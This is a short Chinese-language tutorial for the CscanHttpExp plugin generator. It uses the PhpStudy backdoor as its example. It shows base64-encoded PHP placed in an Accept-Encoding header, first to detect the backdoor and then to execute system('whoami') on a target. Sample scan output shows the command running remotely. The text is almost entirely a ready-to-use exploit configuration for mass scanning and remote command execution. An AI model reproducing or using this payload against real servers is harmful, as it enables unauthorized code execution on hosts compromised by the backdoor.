CscanHttpExp生成器使用教程
PhpStudy后门为例
环境: .net 3.5
将程序和Cscan.exe放在同一目录

0x001 测试POC

打印字符串
echo "ISDoorOK";
K8飞刀Base64编码得到 ZWNobyAiSVNEb29yT0siOw==
如包含 ISDoorOK ,返回PhpStudyDoor

配置
Accept-Encoding: gzip,deflate
Accept-Encoding: ZWNobyAiSVNEb29yT0siOw==

PocTag: ISDoorOK
PocName: PhpStudyDoor

编译DLL并测试结果
Cscan 5.2
By K8gege
load netscan.dll
http://192.168.1.26     PhpStudyDoor
Finished!


0x002 利用EXP
执行whoami命令
echo 'start';system('whoami');echo 'end';

配置
Accept-Encoding: ZWNobyAnc3RhcnQnO3N5c3RlbSgnd2hvYW1pJyk7ZWNobyAnZW5kJzs=

编译DLL并测试结果
Cscan 5.2
By K8gege
load netscan.dll
startwin-4udh62v7dmn\null
endHello World
Finished!

0x003 结果提取
Result勾选替换换行为空格
正则: (?<=start).*?(?=end)


